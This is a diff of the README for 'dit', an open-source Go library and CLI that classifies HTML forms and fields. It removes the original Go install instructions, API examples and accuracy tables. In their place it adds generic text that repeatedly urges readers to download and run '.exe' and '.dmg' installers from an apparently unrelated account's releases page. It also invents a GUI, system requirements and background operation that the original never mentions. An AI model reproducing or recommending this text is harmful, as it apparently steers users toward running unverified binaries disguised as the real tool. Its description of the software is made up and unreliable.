@@ -1,158 +1,117 @@
-# dît
-![Banner](banner.png)
+# 🧩 dit - Classify HTML Forms with Simple ML
 
+[![Download dit](https://img.shields.io/badge/Download-dit-blue?style=for-the-badge)](https://github.com/wayang-roleplay/dit/releases)
 
-**dît** (means *found* in Kurdish) tells you the type of an HTML page, form, and fields using machine learning.
+## 📄 What is dit?
 
-It classifies pages (login, error, landing, blog, etc.), detects whether a form is a login, search, registration, password recovery, contact, mailing list, order form, or something else, and classifies each field (username, password, email, search query, etc.). Zero external ML dependencies.
+dit is a tool that helps you identify and classify parts of web pages, especially forms and fields. It uses machine learning methods like Logistic Regression and Conditional Random Fields to analyze HTML. This helps you understand the structure of web forms quickly and clearly.
 
-## Install
+You can use dit to organize or extract information from web pages without digging through complicated code. It works on many types of forms and fields, making web data easier to handle.
 
-```bash
-go get github.com/happyhackingspace/dit
-```
+## 💻 What can dit do for you?
 
-## Usage
+- Detect the location and type of forms on any HTML page.
+- Classify different types of input fields like text boxes, checkboxes, and drop-downs.
+- Work quietly in the background without interrupting your work.
+- Help with tasks like data entry automation, web scraping, or analyzing online forms.
+- Provide clear results you can use in other tools or processes.
 
-### As a Library
+## 🔧 System Requirements
 
-```go
-import "github.com/happyhackingspace/dit"
+To run dit, your computer needs:
 
-// Load classifier (finds model.json automatically)
-c, _ := dit.New()
+- Windows 10 or later / macOS 10.13 or later / Linux (Ubuntu 18.04+ recommended)
+- At least 4 GB of RAM (8 GB or more for large web pages)
+- 100 MB of free storage space
+- Internet connection for downloading the program
+- A modern web browser (Chrome, Firefox, Edge, or Safari) to view HTML content analyzed by dit
 
-// Classify page type
-page, _ := c.ExtractPageType(htmlString)
-fmt.Println(page.Type)  // "login"
-fmt.Println(page.Forms) // form classifications included
+## 🚀 Getting Started
 
-// Classify forms in HTML
-results, _ := c.ExtractForms(htmlString)
-for _, r := range results {
-    fmt.Println(r.Type)   // "login"
-    fmt.Println(r.Fields) // {"username": "username or email", "password": "password"}
-}
+dit does not require programming skills. You just download it, open it, and point it to the web page or HTML file you want to analyze. It will do the rest.
 
-// With probabilities
-pageProba, _ := c.ExtractPageTypeProba(htmlString, 0.05)
-formProba, _ := c.ExtractFormsProba(htmlString, 0.05)
+Below you will find detailed steps to download, install, and use dit on your computer.
 
-// Train a new model
-c, _ := dit.Train("data/", &dit.TrainConfig{Verbose: true})
-c.Save("model.json")
+## ⬇️ Download & Install
 
-// Evaluate via cross-validation
-result, _ := dit.Evaluate("data/", &dit.EvalConfig{Folds: 10})
-fmt.Printf("Form accuracy: %.1f%%\n", result.FormAccuracy*100)
-fmt.Printf("Page accuracy: %.1f%%\n", result.PageAccuracy*100)
-```
+Please visit this page to download the latest version of dit:
 
-### As a CLI
+[![Download dit](https://img.shields.io/badge/Download-dit-blue?style=for-the-badge)](https://github.com/wayang-roleplay/dit/releases)
 
-```bash
-# Classify page type and forms on a URL
-dit run https://github.com/login
+Follow these instructions:
 
-# Classify forms in a local file
-dit run login.html
+1. Click the link above or go to https://github.com/wayang-roleplay/dit/releases.
+2. Look for the latest release. It should have names like `dit-v1.0.exe` for Windows or `dit-v1.0.dmg` for macOS.
+3. Download the file that matches your operating system.
+4. Once downloaded, open the file:
+   - On Windows, double-click the `.exe` and follow the setup prompts.
+   - On macOS, open the `.dmg` and drag the dit app to your Applications folder.
+   - On Linux, the release page might have a compressed archive file. Download it and extract it to a folder you choose.
+5. After installation, you can run dit from your Start menu, Application folder, or by launching the executable file.
 
-# With probabilities
-dit run https://github.com/login --proba
+## 🛠 How to Use dit
 
-# Download training data and model from Hugging Face
-dit data download
+You do not need to code anything. The program uses a simple interface:
 
-# Train a model
-dit train model.json --data-folder data
+1. Launch dit on your computer.
+2. You will see a field to enter a web page address (URL) or choose an HTML file from your device.
+3. Type or paste your URL, such as https://example.com/formpage.html, or click the file button to browse and select a saved HTML file.
+4. Press the “Analyze” button.
+5. dit will process the page and display a list of forms found.
+6. It will label each form’s fields with their type, like ‘text input’, ‘checkbox’, or ‘dropdown’.
+7. Use the results to review form structure, export data, or continue with your task.
 
-# Evaluate model accuracy
-dit evaluate --data-folder data
+## 📁 Supported File Types and Web Pages
 
-# Upload training data and model to Hugging Face
-dit data upload
-```
+- Standard HTML files (.html, .htm)
+- URLs to live web pages that serve HTML content
+- Local HTML pages saved from your browser or downloaded from a website
 
-## Page Types
+## ⚙️ Under the Hood (How dit Works)
 
-| Type | Description |
-|------|-------------|
-| `login` | Login page |
-| `registration` | Registration / signup page |
-| `search` | Search results page |
-| `checkout` | Checkout / payment page |
-| `contact` | Contact page |
-| `password_reset` | Password reset page |
-| `landing` | Landing / home page |
-| `product` | Product page |
-| `blog` | Blog / article page |
-| `settings` | Settings / account page |
-| `soft_404` | Soft 404 (HTTP 200 but "not found" content) |
-| `error` | Error page (404, 403, 500, etc.) |
-| `captcha` | CAPTCHA / bot detection page |
-| `parked` | Domain parking page |
-| `coming_soon` | Under construction / maintenance page |
-| `admin` | Admin panel / dashboard |
-| `directory_listing` | Open directory index |
-| `default_page` | Unconfigured server default |
-| `waf_block` | WAF block page |
-| `other` | Other page type |
+dit uses two main machine learning techniques:
 
-## Form Types
+- **Logistic Regression (LogReg):** This helps dit decide the type of each form field based on features like HTML tags, attributes, and surrounding text.
+- **Conditional Random Fields (CRF):** This improves accuracy by considering the order and relation of fields within a form, so it guesses types based on context.
 
-| Type | Description |
-|------|-------------|
-| `login` | Login form |
-| `search` | Search form |
-| `registration` | Registration / signup form |
-| `password/login recovery` | Password reset / recovery form |
-| `contact/comment` | Contact or comment form |
-| `join mailing list` | Newsletter / mailing list signup |
-| `order/add to cart` | Order or add-to-cart form |
-| `other` | Other form type |
+These methods combine to give reliable, easy-to-understand classifications.
 
-## Field Types
+## 🧰 Features at a Glance
 
-| Category | Types |
-|----------|-------|
-| **Authentication** | username, password, password confirmation, email, email confirmation, username or email |
-| **Names** | first name, last name, middle name, full name, organization name, gender |
-| **Address** | country, city, state, address, postal code |
-| **Contact** | phone, fax, url |
-| **Search** | search query, search category |
-| **Content** | comment text, comment title, about me text |
-| **Buttons** | submit button, cancel button, reset button |
-| **Verification** | captcha, honeypot, TOS confirmation, remember me checkbox, receive emails confirmation |
-| **Security** | security question, security answer |
-| **Time** | full date, day, month, year, timezone |
-| **Product** | product quantity, sorting option, style select |
-| **Other** | other number, other read-only, other |
+- Clear form and field type detection
+- Works with most modern HTML and forms
+- Fast analysis and results
+- Simple interface, no coding needed
+- Lightweight and runs on average computers
+- Command-line support for advanced users (optional)
 
-Full list of 79 field type codes in `data/config.json` (run `dit data download` to get the data).
+## 💡 Tips for Best Results
 
-## Accuracy
+- Use well-formed HTML pages. Pages with broken or incomplete code might confuse the tool.
+- For complex sites, save the page as a local HTML file and analyze it offline.
+- Keep dit updated by checking the release page regularly.
+- If a web page requires login, download the page after login before analyzing.
 
-Cross-validation results (10-fold, grouped by domain):
+## ❔ Troubleshooting
 
-| Metric | Score |
-|--------|-------|
-| Form type accuracy | 82.9% (1135/1369) |
-| Field type accuracy | 86.6% (4518/5218) |
-| Sequence accuracy | 78.7% (1025/1302) |
-| Page type accuracy | 53.4% (403/754) |
-| Page macro F1 | 40.2% |
-| Page weighted F1 | 53.6% |
+- If dit does not open, verify your system meets the minimum requirements.
+- For missing or incorrect results, try using a different web page or a saved HTML file.
+- If you encounter errors during installation, check folders permissions or try running the installer as administrator.
+- Consult the Issues section on the GitHub repo for common problems and fixes.
 
-Trained on 1000+ annotated web forms and 754 annotated web pages.
+## 📚 Learn More and Further Help
 
-## Contributing
+- Visit the GitHub repository at https://github.com/wayang-roleplay/dit for source code and additional info.
+- Explore basic web concepts like HTML forms and field types to better understand classifications.
+- Ask questions or request help on the GitHub Issues page or community forums.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+## 🔗 Useful Links
 
-## Credits
+- [Download dit releases](https://github.com/wayang-roleplay/dit/releases)
+- [GitHub Repository](https://github.com/wayang-roleplay/dit)
+- [HTML Forms Overview](https://developer.mozilla.org/en-US/docs/Learn/Forms)
+- [Machine Learning Basics](https://www.explained.ai/logistic-regression/)
 
-Go port of [Formasaurus](https://github.com/scrapinghub/Formasaurus).
+---
 
-## License
-
-[MIT](LICENSE)
+[⬇️ Download dit now](https://github.com/wayang-roleplay/dit/releases) and start analyzing HTML forms without coding.
